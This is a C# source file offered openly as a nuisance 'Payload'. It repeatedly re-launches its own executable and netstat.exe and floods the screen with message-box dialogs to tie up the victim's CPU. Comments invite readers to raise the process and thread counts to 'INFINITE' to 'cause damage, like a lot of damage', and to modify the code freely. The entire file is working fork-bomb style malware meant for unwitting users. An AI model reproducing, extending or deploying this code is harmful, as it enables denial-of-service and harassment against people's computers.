
/* 

(c) All Rights Reserved, Dashies Software Inc.

Me when you join my server : "It is so FUCKING beautiful (ಥ﹏ಥ)"
 
I have written this little Payload for you, it will annoy the users
by spamming their CPU Full of work and Spamming them with a lot of
Dialog Boxes. The longer the Payload Runs, the Stronger it will get.

I hope you understand the codes, if not, I am always here to help
you with it.
 
Feel free to modify the codes to your liking. 
 
*/

using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Text;
using System.Reflection;
using System.Diagnostics;
using System.Threading.Tasks;


namespace Grace
{
    public partial class Program
    {
        // If you just want to cause damage , like a lot of damage, enter this instead of 1 for both Threads and Processes.
        // Something like : 
        //                  private static int Processes = INFINITE, Threads = INFINITE;

        private static int INFINITE = 696;


        // Processes are the amount of executions that should be performed.
        // Threads are the amount of threads that will be occupied by this app.		

        private static int Processes = 1, 
                           Threads = 1;


        // All the executables that we will run when the user executes this
        // Payload c:

        private static string[] Service =
        {
            "C:\\Windows\\System32\\netstat.exe", 		// some matrix type shit
			Assembly.GetExecutingAssembly().Location	// this application "The more the better."
		};


        // This is the main function, the entry of our Console Application.

        public static void Main(string[] A)
        {
            for (int index = 1; index <= Threads; index += 1)
            {
                Task thread1 = Task.Run((Action)Thread1);
                Task thread2 = Task.Run((Action)Thread2);
                Console.ReadKey();
            }
        }


        // Thread 2, this one will load all the specified Services.

        private static void Thread2()
        {
            for (int index = 1; index <= Processes; index += 1)
            {
                foreach (string exe in Service)
                {
                    ProcessStartInfo inf = new ProcessStartInfo()
                    {
                        CreateNoWindow = true,
                        UseShellExecute = true
                    };

                    Process.Start(exe);
                }
            }
        }


        // Thread 1, this one will annoy the user by asking them how they are doing.
        private static void Thread1()
        {
            for (int index = 1; index <= Threads; index += 1)
            {
                Task threaded_dialog = Task.Run((Action)Dialog);
                System.Threading.Thread.Sleep(2000);
            }
        }


        // The dialog with the question.
        private static void Dialog()
        {
            MessageBox.Show("Hey, how are you doing?", "#Dashed");
            Task Reply = Task.Run((Action)ThatSecondDialog); // Another Dialog replying to the first dialog.
        }


        // The replying dialog as descripted in private static void Dialog()
        private static void ThatSecondDialog()
        {
            MessageBox.Show("I am guud, how bout you fluffer?");
        }
    }
}